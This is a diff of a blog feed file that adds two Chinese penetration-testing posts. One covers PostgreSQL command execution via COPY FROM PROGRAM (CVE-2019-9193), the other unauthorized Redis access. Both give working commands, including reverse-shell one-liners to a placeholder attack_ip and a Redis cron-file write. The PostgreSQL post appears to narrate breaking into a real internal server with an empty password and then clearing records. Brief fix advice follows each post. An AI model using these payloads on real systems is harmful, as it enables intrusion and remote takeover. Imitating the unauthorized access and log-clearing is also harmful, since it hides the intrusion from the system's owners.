@@ -4,6 +4,56 @@
   
   
   <entry>
+    <title>PostgreSQL任意命令执行漏洞利用（CVE-2019-9193</title>
+    <link href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/"/>
+    <url>/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/</url>
+    
+    <content type="html"><![CDATA[<p>最近没事曰曰内网，偶然发现了一个使用空密码的pg（是的，连爆破都省了）。用navicat连上去看了下几个库都是一些业务测试数据，没什么好收集；不死心，google了一下发现有个比较新的CVE好像可以操作一下~</p><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>最近，安全研究人员披露了PostgreSQL实例代码执行漏洞（CVE-2019-9193）的漏洞细节。具有数据库 服务器 文件读取权限的攻击者可以利用此漏洞执行任意系统命令。</p><p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令。</p><p>**受影响的版本（貌似更新版本无解）</p><p>PostgreSQL&gt; = 9.3**</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="pg数据库连接"><a href="#pg数据库连接" class="headerlink" title="pg数据库连接"></a>pg数据库连接</h5><pre><code class="hljs plain"># 连接postgressql，虽然是内网ip但还是打一下码吧psql -U postgres -h 172.xx.xxx.xx</code></pre><p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="开始攻击（直接套用网上POC）"><a href="#开始攻击（直接套用网上POC）" class="headerlink" title="开始攻击（直接套用网上POC）"></a>开始攻击（直接套用网上POC）</h5><pre><code class="hljs plain"># 删除并创建用于保存系统命令执行结果的表 DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);# 命令执行测试，多试几条COPY cmd_exec FROM PROGRAM &#39;id&#39;;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;# 查看结果SELECT * FROM cmd_exec;</code></pre><p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>我的🐎，还是个root用户，，都不用提权了（这安全意识阿。。。）</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>虽然都可以执行系统命令了，拿不拿shell无所谓，但拿了还是要方便一些；</p><pre><code class="hljs plain"># attack机器上开启监听nc -lvnp 8888# 利用pg执行远程连接命令COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre><p>attack机器已经返回shell连接了~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p><p>记录一下，顺便清除记录收工了。</p><h4 id="解决方案建议"><a href="#解决方案建议" class="headerlink" title="解决方案建议"></a>解决方案建议</h4><p>1、pg_read_server_files，pg_write_server_files和pg_execute_server_program角色涉及读取和写入具有大权限的数据库服务器文件。将此角色权限分配给数据库用户时，应慎重考虑。</p><p>2、使用强密码！！！</p><p>3、进行网络隔离，只允许需要的IP连接；</p><p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>安全</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Redis未授权访问漏洞利用</title>
+    <link href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <url>/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
+    
+    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><pre><code class="hljs plain"># redis安装wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gztar -xvzf redis-3.2.0.tar.gzcd redis-3.2.0make# 修改配置文件vim redis.conf# bind 127.0.0.1               前面加上#号    # protected-mode设为no protected-mode no# 保存退出# 启动redis-serverredis-server redis-conf</code></pre><p>观察到如下输出，漏洞环境搭建成功<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开9999端口监听[root@]# nc -vv -l -p 9999</code></pre><h5 id="未授权访问验证"><a href="#未授权访问验证" class="headerlink" title="未授权访问验证"></a>未授权访问验证</h5><pre><code class="hljs plain"># 连接靶机redisredis -h target_ip# 获取redis版本等信息target_ip&gt; info</code></pre><p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><pre><code class="hljs plain"># 设置变量target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;OK# 修改redis默认目录和rdb文件target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOKtarget_ip:6379&gt; config set dbfilename rootOKtarget_ip:6379&gt; saveOK</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得关闭存在漏洞的redis</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>方法一： 可以修改绑定的IP、端口和指定访问者IP 具体根据实际情况来设定，也可以直接在服务器防火墙上做设置。</p><p>方法二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。</p><p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>安全</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Docker Remote API 未授权访问漏洞利用</title>
     <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
